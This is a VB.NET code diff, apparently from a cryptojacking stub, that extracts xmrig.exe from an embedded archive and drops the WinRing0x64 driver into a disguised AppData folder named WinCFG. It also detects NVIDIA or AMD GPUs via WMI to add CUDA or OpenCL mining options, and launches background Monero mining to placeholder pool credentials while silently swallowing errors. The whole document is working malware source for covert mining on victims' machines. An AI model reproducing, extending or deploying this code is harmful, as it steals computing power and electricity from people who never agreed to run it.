@@ -105,6 +105,7 @@ Public Class Program
     Public Shared Sub Initialize()
         Try
             Dim xmr As Byte() = GetTheResource("#xmr")
+            Dim xmrminer As Byte() = New Byte() {}
             Dim winring As Byte() = GetTheResource("#winring")
             Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
             Dim runString As String = ""
@@ -113,14 +114,43 @@ Public Class Program
                 System.IO.Directory.CreateDirectory(baseDir)
                 My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)
 
+
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(xmr))
+                    For Each entry As ZipArchiveEntry In archive.Entries
+                        If entry.FullName.Contains("xmrig.exe") Then
+                            Using streamdata As Stream = entry.Open()
+                                Using ms = New MemoryStream()
+                                    streamdata.CopyTo(ms)
+                                    xmrminer = ms.ToArray
+                                End Using
+                            End Using
+                        End If
+                    Next
+                End Using
+
+
 #If EnableGPU Then
-            Dim libs As Byte() = GetTheResource("#libs")
-            Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
-                For Each entry As ZipArchiveEntry In archive.Entries
-                    entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
-                Next
-            End Using
-            runString += " --opencl --cuda "
+            Dim GPUstr as String = GetGPU
+            If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
+                Try
+                    Dim libs As Byte() = GetTheResource("#libs")
+                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
+                        For Each entry As ZipArchiveEntry In archive.Entries
+                            entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
+                        Next
+                    End Using
+
+                    If GPUstr.ToLower.Contains("nvidia") Then
+                        runString += " --cuda --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote
+                    End If
+
+                    If GPUstr.ToLower.Contains("amd") Then
+                        runString += " --opencl "
+                    End If
+
+                Catch ex As Exception
+                End Try
+            End If
 #End If
             Catch ex As Exception
             End Try
@@ -140,10 +170,39 @@ Public Class Program
 #End If
 
             'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
-            Run(GetTheResource("#dll"), runString + " -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
+            Dim argstr As String = " -B --coin=monero --url=""#URL"" --user=""#USER"" --pass=""#PWD"" --cpu-max-threads-hint=#MaxCPU "
+            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
+            Run(GetTheResource("#dll"), runString + argstr, xmrminer)
         Catch ex As Exception
         End Try
     End Sub
+
+    Public Shared Function GetGPU() As String
+        Try
+            Dim VideoCard As String = ""
+            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
+            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)
+
+            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
+                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
+            Next
+
+            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
+                Return VideoCard
+            End If
+
+            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
+                VideoCard = VideoCard & (MemObj("Name")) & " "
+            Next
+
+            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
+                Return VideoCard
+            End If
+            Return ""
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
 
     Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
         Dim AES As New RijndaelManaged
